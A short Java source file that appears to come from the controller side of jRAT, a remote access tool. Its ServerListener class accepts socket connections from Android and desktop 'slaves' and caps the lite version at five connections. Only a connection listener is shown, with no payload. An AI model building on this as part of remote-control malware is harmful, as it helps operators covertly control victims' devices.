package se.jrat.client.net;

import java.net.Socket;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.Slave;
import se.jrat.client.android.AndroidSlave;
import se.jrat.client.exceptions.CloseException;
import se.jrat.client.settings.SettingsSockets;
import se.jrat.common.ConnectionCodes;

public class ServerListener extends PortListener implements Runnable {

	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
		super(name, port, timeout, pass, SettingsSockets.SocketType.NORMAL_SOCKET);
	}

	@Override
	public void run() {
		while (!server.isClosed()) {
			try {

				Socket socket = server.accept();

				int type = socket.getInputStream().read();

				AbstractSlave slave;

				if (type == ConnectionCodes.ANDROID_SLAVE) {
					slave = new AndroidSlave(this, socket);
				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
					slave = new Slave(this, socket);
				}

				if (type < 0 || type > 1) {
					slave = new Slave(this, socket);
					Main.instance.getPanelLog().addEntry("Error", slave, "Invalid connection type");
					continue;
				}

				if (Main.liteVersion && Main.connections.size() >= 5) {
					slave = new Slave(this, socket);
					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
					Main.instance.getPanelLog().addEntry("Warning", slave, "Maximum of 5 connections reached");
					continue;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
